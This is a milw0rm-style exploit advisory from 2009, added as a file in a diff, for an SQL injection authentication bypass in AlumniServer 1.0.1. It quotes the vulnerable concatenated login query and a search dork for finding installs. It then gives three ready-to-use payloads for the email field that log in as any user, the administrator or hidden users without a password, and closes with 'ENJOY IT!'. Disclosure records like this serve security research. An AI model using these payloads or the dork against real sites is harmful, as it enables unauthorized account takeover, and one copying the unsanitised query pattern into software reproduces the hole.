@@ -1,0 +1,154 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                            VIVA SPAIN!...GANAREMOS EL MUNDIAL!...o.O                      **
+**					 PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	          SQL INJECTION VULNERABILITY		      	             |
+|--------------------------------------------------------------------------------------------|
+|                              |     AlumniServer v-1.0.1     |		                     |
+|  CMS INFORMATION:	        ------------------------------	                             |
+|										             |
+|-->WEB: http://www.alumniserver.net/			          	                     |
+|-->DOWNLOAD: http://www.alumniserver.net/		         	                     |
+|-->DEMO: N/A   	     			    					     |
+|-->CATEGORY: CMS/Education								     |
+|-->DESCRIPTION: Open Source Alumni software, based on PHP+MySQL for universities, schools   |
+|		and companies. Services for usersinclude profile page,...	     	     |
+|-->RELEASED: 2009-06-11								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORK: "AlumniServer project"					                     |
+|-->CATEGORY: AUTH-BYPASS (SQLi)				                             |
+|-->AFFECT VERSION: CURRENT				 			             |
+|-->Discovered Bug date: 2009-06-16							     |
+|-->Reported Bug date: 2009-06-16							     |
+|-->Fixed bug date: N/A									     |
+|-->Info patch (????): N/A					  			     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+
+#####################
+////////////////////
+
+AUTH-BYPASS (SQLi):
+
+////////////////////
+#####################
+
+
+
+<<<<---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++--------->>>>
+
+
+
+-----------
+VULN FILE:
+-----------
+
+
+
+Path --> [HOME_PATH]/login.php
+Lines --> 26, 32, 72
+
+
+//Note: requestVar is a function against LFI and XSS mainly, 
+//avoiding register_globals ON and filtering \r\n, \r, \0, etc and using htmlespecialchars.
+
+
+...
+
+26:  $email=requestVar('login','',true);
+
+...
+
+32:  $pwd=requestVar('password','',true);
+
+...
+
+72: $result=mysql_query("SELECT * FROM `as_users` WHERE (email LIKE '".$email."') AND (password LIKE '".md5($pwd)."') LIMIT 1",$dbh); <-- Vuln line
+
+...
+
+
+-----------
+EXPLOITS:
+-----------
+
+
+
+[!!!] Case-1: If only one user (rarely)...
+
+
+~~~> E-Mail=y3nh4ck3r@gmail.com') OR 1=1 /*
+~~~> Password=nothing
+
+
+[!!!] Case-2: If more users...
+
+
+[++] Note: Search mail for admin (http://[HOST]/[PATH]/Imprint.php):
+
+
+~~~> E-Mail=[real_admin_mail]')/*
+~~~> Password=nothing
+
+
+[++] Note: Search for first or second name.
+[++] Note: AdminGn, AdminSn By default. Not use id because it's generated randomly. With a registered user 
+	is easy to get necessary information.
+
+
+~~~> E-Mail=y3nh4ck3r@gmail.com') OR gn='AdminGn' /*
+~~~> Password=nothing
+
+
+[!!!] Case-3: If admin is a hidden user...
+
+
+~~~> E-Mail=y3nh4ck3r@gmail.com') OR hideuser='y' /*
+~~~> Password=nothing
+
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+
+
+##############################################################################
+##############################################################################
+##**************************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
+##**************************************************************************##
+##--------------------------------------------------------------------------##
+##**************************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
+##**************************************************************************##
+##############################################################################
+##############################################################################
+
+# milw0rm.com [2009-06-25]
